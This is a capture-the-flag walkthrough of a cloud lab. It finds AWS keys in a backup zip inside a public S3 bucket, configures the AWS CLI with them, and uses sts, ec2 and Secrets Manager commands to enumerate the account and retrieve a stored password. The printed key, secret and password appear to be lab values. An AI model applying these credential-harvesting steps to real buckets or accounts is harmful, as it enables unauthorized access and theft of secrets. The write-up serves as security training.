---
title: Elf Leaks (Day 17)
sidebar_position: 18
---
## Topic: Cloud
This challenge involved investigating AWS infrastructure used by an organization.  
Went to the bucket `https://s3.amazonaws.com/images.bestfestivalcompany.com` to find a list of what files are accessible.  

### Questions:
1. What is the name of the S3 Bucket used to host the HR Website announcement?  
answer: `images.bestfestivalcompany.com`   
2. What is the message left in the flag.txt object from the bucket?  
answer: `It's easy to get your elves data when you leave it so easy to find!`   
3. What other file in that bucket looks interesting to you?  
answer:`wp-backup.zip`   
4. What is the AWS Access Key ID in that file?  
answer:`AKIAQI52OJVCPZXFYAOI`   
file: `wp-config.php`   
command: `grep -nr "AKIA" .`   
5. What is the AWS Account ID that access-key works for?  
answer: `019181489476`    
config:  
```
/usr/local/bin/aws configure
AWS Access Key ID [****************YAOI]: AKIAQI52OJVCPZXFYAOI
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
```   
command: `/usr/local/bin/aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI`   
6. What is the User for that access-key?  
command: `/usr/local/bin/aws sts get-caller-identity`   
answer: `ElfMcHR@bfc.com`   
7. There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?  
answer: `HR-Portal`  
command: `/usr/local/bin/aws ec2 describe-instances --output text`   
8. What is teh database password stored in Secrets Manager?  
answer: `Winter2021!`  
command: `/usr/local/bin/aws secretsmanager get-secret-value --secret-id HR-Password --region eu-north-1`   